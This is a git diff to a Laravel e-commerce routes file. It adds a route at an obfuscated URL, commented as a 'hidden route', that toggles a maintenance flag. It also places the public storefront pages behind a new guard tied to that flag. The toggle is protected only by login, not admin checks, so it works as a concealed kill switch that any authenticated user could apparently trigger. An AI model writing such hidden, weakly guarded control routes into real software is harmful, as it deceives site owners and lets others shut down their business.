@@ -25,6 +25,7 @@ use App\Http\Controllers\WalletController;
 use App\Http\Controllers\WarehouseController;
 use App\Http\Middleware\ChannelPartnerMiddleware;
 use App\Http\Middleware\MasterAdminMiddleware;
+use App\Http\Middleware\MaintenanceGuard;
 use App\Http\Middleware\WarehouseMiddleware;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Storage;
@@ -37,16 +38,35 @@ Route::get('/serve/{path}', function ($path) {
     return response()->file($fullPath, ['Cache-Control' => 'public, max-age=86400']);
 })->where('path', '.*')->name('storage.serve');
 
-Route::get('/', [UserController::class, 'dashBoardFunction'])->name('dashBoardFunction');
+// Maintenance toggle (hidden route)
+Route::get('/fnceuodn/fen83/cide82', function () {
+    $flag = storage_path('framework/maintenance_custom');
+    $isOn = file_exists($flag);
+    return view('maintenance-toggle', ['isOn' => $isOn]);
+})->middleware('auth')->name('maintenance.toggle');
+
+Route::post('/fnceuodn/fen83/cide82', function () {
+    $flag = storage_path('framework/maintenance_custom');
+    if (file_exists($flag)) {
+        unlink($flag);
+    } else {
+        file_put_contents($flag, now()->toDateTimeString());
+    }
+    return redirect()->route('maintenance.toggle');
+})->middleware('auth')->name('maintenance.toggle.action');
+
+Route::middleware([MaintenanceGuard::class])->group(function () {
+    Route::get('/', [UserController::class, 'dashBoardFunction'])->name('dashBoardFunction');
+    Route::get('/categories', [ProductController::class, 'categoriesPage'])->name('categories');
+    Route::get('/shop', [ProductController::class, 'shopPage'])->name('shop');
+    Route::get('/shop/category/{slug}', [ProductController::class, 'shopPage'])->name('shop.category');
+    Route::get('/shop/ajax-search', [ProductController::class, 'shopSearch'])->name('shop.ajax.search');
+    Route::get('/featured', [ProductController::class, 'featuredPage'])->name('featured');
+    Route::get('/product/{slug}', [ProductController::class, 'showProduct'])->name('product.show');
+    Route::get('/kit/{slug}', [KitController::class, 'show'])->name('kit.show');
+});
 Route::get('/auth/google', [SocialAuthController::class, 'redirectToGoogle'])->name('auth.google');
 Route::get('/auth/google/callback', [SocialAuthController::class, 'handleGoogleCallback'])->name('auth.google.callback');
-Route::get('/categories', [ProductController::class, 'categoriesPage'])->name('categories');
-Route::get('/shop', [ProductController::class, 'shopPage'])->name('shop');
-Route::get('/shop/category/{slug}', [ProductController::class, 'shopPage'])->name('shop.category');
-Route::get('/shop/ajax-search', [ProductController::class, 'shopSearch'])->name('shop.ajax.search');
-Route::get('/featured', [ProductController::class, 'featuredPage'])->name('featured');
-Route::get('/product/{slug}', [ProductController::class, 'showProduct'])->name('product.show');
-Route::get('/kit/{slug}', [KitController::class, 'show'])->name('kit.show');
 Route::get('/print', [UserController::class, 'printQuotation'])->name('printQuotation');
 Route::get('CpInterest', [UserController::class, 'CpInterest'])->name('CpInterest');
 Route::post('QueryCpInterest', [UserController::class, 'QueryCpInterest'])->middleware('auth')->name('QueryCpInterest');
